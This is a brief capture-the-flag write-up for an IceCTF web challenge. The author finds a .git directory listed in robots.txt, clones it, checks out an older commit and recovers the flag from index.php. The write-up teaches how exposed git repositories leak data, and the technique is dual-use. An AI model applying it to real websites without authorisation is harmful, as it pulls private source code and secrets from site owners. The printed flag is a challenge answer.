### Solved by superkojiman

It's a simple website. I found robots.txt revealed two things:

```
.git
flag.php
```

The git repository looked promising, so I cloned it: 

```
git clone exposed.vuln.icec.tf/.git
```

I poked around and found the flag is in revision f5674cbaacd842cfacb9f825c29f7f3e5150c7ef in index.php

```
$ git checkout f5674cbaacd842cfacb9f825c29f7f3e5150c7ef
Previous HEAD position was 672c8f6... added colors
HEAD is now at f5674cb... enlarged text
root|ice|~/work/web/exposed/exposed.vuln.icec.tf
$ ls
index.php

root|ice|~/work/web/exposed/exposed.vuln.icec.tf
$ cat index.php
.
.
.
echo 'Hello World! IceCTF{secure_y0ur_g1t_repos_pe0ple}';
.
.
.
```
